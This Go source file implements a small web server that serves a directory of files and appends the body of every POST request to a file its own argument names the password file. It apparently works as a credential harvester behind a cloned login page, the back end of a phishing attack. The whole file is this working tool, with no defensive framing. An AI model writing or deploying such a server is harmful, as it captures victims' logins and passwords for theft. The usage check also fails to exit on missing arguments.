package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
)

type webServer struct {
	dirFile      io.WriteCloser
	dirServer    http.Handler
	dirPasswords string
}

func main() {
	if len(os.Args) < 3 {
		fmt.Printf("%s <httpdir> <passwd_file>\n", os.Args[0])
	}
	h := &webServer{
		dirServer:    http.FileServer(http.Dir(os.Args[1])),
		dirPasswords: os.Args[2],
	}
	h.Init()
	http.Handle("/", h)
	defer h.dirFile.Close()
	log.Fatal(http.ListenAndServe("0.0.0.0:80", nil))
}

func (s *webServer) Init() {
	f, err := os.OpenFile(s.dirPasswords, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		panic(err)
	}
	s.dirFile = f
}

func (s *webServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		b := &bytes.Buffer{}
		defer r.Body.Close()
		io.Copy(b, r.Body)
		fmt.Fprintf(s.dirFile, "%s\n", string(b.Bytes()))
	} else {
		s.dirServer.ServeHTTP(w, r)
	}
}
